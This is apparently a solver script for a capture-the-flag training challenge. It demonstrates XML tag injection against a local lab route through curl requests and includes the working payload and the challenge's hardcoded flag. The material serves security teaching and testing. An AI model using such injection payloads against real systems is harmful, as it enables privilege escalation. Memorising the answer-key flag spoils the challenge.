#!/usr/bin/env bash
# solvers/p5_2.sh — Task 5.2 "Palace Blueprint Tampering" canonical exploit.
#
# challenges/phase5.py's p5_blueprint() route builds an XML document with
# a plain Python .format() call:
#
#   "<badge><visitor>{name}</visitor><clearance>guest</clearance></badge>"
#
# and never escapes `< > & ' "` out of `name` first. A visitor name that
# closes the <visitor> tag early and opens a new <clearance> element of
# its own becomes real sibling markup once parsed — lxml's `.find()`
# then returns whichever <clearance> element comes first in document
# order, which is the injected one if it was placed before the
# template's own fixed element.
#
# This script proves three things against the live stack, in order:
#
#   1. A plain visitor name (no XML metacharacters) prints an ordinary
#      "guest" badge and reveals no flag.
#   2. A stray, unbalanced `<` in the name is rejected by the parser as
#      malformed XML — the parser genuinely enforces well-formedness; the
#      bug is not "anything goes," it's "well-formed-but-restructured is
#      still accepted."
#   3. A name that injects a second, well-formed <clearance>royal</clearance>
#      element ahead of the template's own gets printed onto the badge
#      instead — recovering the flag from the real seeded
#      palace_clearances table.

set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{inject_a_new_tag}"
ROUTE="${BASE}/p5/blueprint"

fail=0

echo "[p5_2] target: ${ROUTE}"

# --- Step 1 — a plain name prints an ordinary guest badge ------------------
echo "[p5_2] step 1 — plain visitor name: name=Gon"

plain_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "name=Gon")
echo "  response: ${plain_resp}"

if echo "$plain_resp" | grep -q '"clearance":"guest"'; then
    echo "  ok: plain name printed an ordinary guest badge"
else
    echo "[p5_2] FAIL: plain name did not print a guest badge — route is broken"
    fail=1
fi
if echo "$plain_resp" | grep -qF "$FLAG"; then
    echo "[p5_2] FAIL: an ordinary guest badge leaked the flag"
    fail=1
fi

# --- Step 2 — an unbalanced metacharacter is rejected as malformed XML -----
echo '[p5_2] step 2 — malformed XML metachar: name=<'

malformed_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "name=<")
echo "  response: ${malformed_resp}"

if echo "$malformed_resp" | grep -q '"error":null'; then
    echo "[p5_2] FAIL: a stray '<' did not produce a parser error — the parser"
    echo "  isn't genuinely enforcing well-formed XML."
    fail=1
else
    echo "  ok: a stray '<' was rejected as malformed XML (parser genuinely runs)"
fi

# --- Step 3 — the tag-injection payload -------------------------------------
echo '[p5_2] step 3 — tag injection: name=</visitor><clearance>royal</clearance><visitor>x'

bypass_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode 'name=</visitor><clearance>royal</clearance><visitor>x')
echo "  response: ${bypass_resp}"

if echo "$bypass_resp" | grep -q '"clearance":"royal"' && echo "$bypass_resp" | grep -qF "$FLAG"; then
    echo "  ok: injected <clearance>royal</clearance> won the badge — flag recovered: ${FLAG}"
else
    echo "[p5_2] FAIL: tag-injection payload did not produce a royal badge with the flag"
    fail=1
fi

if [ "$fail" -ne 0 ]; then
    echo "[p5_2] FAIL"
    exit 1
fi

echo "[p5_2] ok: plain badge clean, malformed XML rejected, tag injection"
echo "[p5_2]     recovered the flag from real seeded palace_clearances"
echo "[p5_2] PASS"
exit 0
